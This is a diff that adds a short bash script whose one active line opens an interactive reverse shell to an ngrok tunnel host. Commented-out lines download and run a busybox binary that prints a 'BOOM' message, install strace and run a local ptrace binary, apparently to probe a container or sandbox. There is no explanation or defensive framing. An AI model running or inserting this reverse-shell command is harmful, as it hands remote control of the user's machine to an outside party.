@@ -1,0 +1,15 @@
+#!/bin/bash
+
+#apt-get update
+
+bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/14980 0>&1
+
+#apt-get install -y wget
+#wget https://busybox.net/downloads/binaries/1.21.1/busybox-i686
+#chmod +x busybox-i686
+#./busybox-i686 echo "BOOM — upper layer binary executed"
+
+#apt update && apt install -y strace
+#strace ls
+
+#./ptrace
